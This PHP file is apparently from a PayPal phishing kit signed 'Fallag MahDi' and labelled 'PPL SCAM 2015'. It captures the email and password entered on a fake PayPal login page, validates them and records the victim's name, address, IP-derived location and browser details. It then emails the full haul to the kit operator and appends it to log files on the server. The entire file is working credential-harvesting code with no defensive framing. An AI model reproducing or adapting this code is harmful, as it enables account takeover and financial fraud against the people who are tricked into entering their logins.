<?php 
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
date_default_timezone_set("Africa/Tunis");
$rand = $_GET['dispatch'];
$status = json_decode(CheckLogin($_POST), true);
if($status['status'] == "false")
{
die('<META HTTP-EQUIV="Refresh" Content="0; URL=index.php?dispatch='.$rand.'&email='.$_POST['MAHDI_1'].'&id=wrong">');
}
function generateRandomString($length = 10) {
    $characters = '0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

function generateRandomPP() {
    $t1 = generateRandomString(5);
    $t2 = generateRandomString(5);
    $t3 = generateRandomString(5);
    $randomString = 'PP'.$t1.'-'.$t2.'-'.$t3;
    return $randomString;
}
$_SESSION['email'] = $_POST['MAHDI_1'];
$_SESSION['pass'] = $_POST['MAHDI_2'];
$_SESSION["prenom"] = $status['fname'];
$_SESSION["nom"] = $status['lname'];
$_SESSION["homeAddress"] = $status['addres'];
$_SESSION["zip"] = $status['zip'];
$_SESSION["city"] = $status['city'];
$_SESSION["country"] = $status['country'];
$_SESSION["pay"] = $status['pay'];
$_SESSION['idpp'] = generateRandomPP();
$_SESSION['Done'] = 1;
$ip = getenv("REMOTE_ADDR");
$ch = curl_init('http://api.hostip.info/get_json.php?ip='.$ip);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$obj = json_decode($output);
if($obj->{'country_name'} == "(Unknown Country?)"){
	$con = "XXXXXXX";
} else {
	$con = $obj->{'country_name'};
}
if($obj->{'city'} == "(Unknown City?)"){
	$cit = "XXXXXXX";
} else {
	$cit = $obj->{'city'};
}
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$msg =  "<div style='font-size:13px;font-family:monospace'>";
$msg .= "<b>------------------+| PPL SCAM 2015 |+------------</b><br><br>";
$msg .= "MAIL = <b>".$_POST['MAHDI_1']."</b><br>\n";
$msg .= "PASS = <b>".$_POST['MAHDI_2']."</b><br>\n";
$msg .= "<b><br>------------------+| Automated Information <i>(By Login)</i> |+------------</b><br><br>";
$msg .= "NAME = <b>".$status['fname'].' '.$status['lname']."</b><br>\n";
$msg .= "ADRS = <b>".$status['addres'].' '.$status['city'].' '.$status['zip']."</b><br>\n";
$msg .= "CNTR = <b>".$status['country']."</b><br>\n";
$msg .= "<b><br>------------------+| Automated Information <i>(By IP)</i> |+------------</b> <br><br>";
$msg .= "CNTR = <b>".$con."</b> <IMG SRC='http://api.hostip.info/flag.php?ip=".$ip."' style='width: 26px;' ><br>\n";
$msg .= "CITY = <b>".$cit."</b><br>\n";
$msg .= "OOIP = <a href='http://www.geoiptool.com/?IP=$ip' target='_blank'>$ip (Click for more information)</a><br>";
$msg .= "TIME = <b>".$time."</b><br>\n";
$msg .= "DATE = <b>".$date."</b><br>\n";
$msg .= "USER = <b>".$userag."</b><br>\n";
$msg .= "<b><br>------------------+| By Fallag MàhDi |+------------ </b>";
$msg .= "<b><br>------------------+| Happy shop :) |+------------ </b></div><br>";
$msg = wordwrap($msg,70);
$sub = "FG MD > PayPal Login | $ip | ".$_POST['MAHDI_1']."";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: PayPal.Rez" . "\r\n";
if($m2 == 1) {
    $myFile = "../rezmdf.html";
    $fh = @fopen($myFile, 'a+') or die("can't open file");
    @fwrite($fh, $msg);
    @fclose($fh);
}
mail($to,$sub,$msg,$head);
$msg = "<b>".$_POST['MAHDI_1']." </b> with <b>$ip</b> has finished from <b>Index</b> at <b>$time - $date</b>, Check your email for login<br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);

$css = css_while();
$html = html_while($css, "");
die($html);
?>
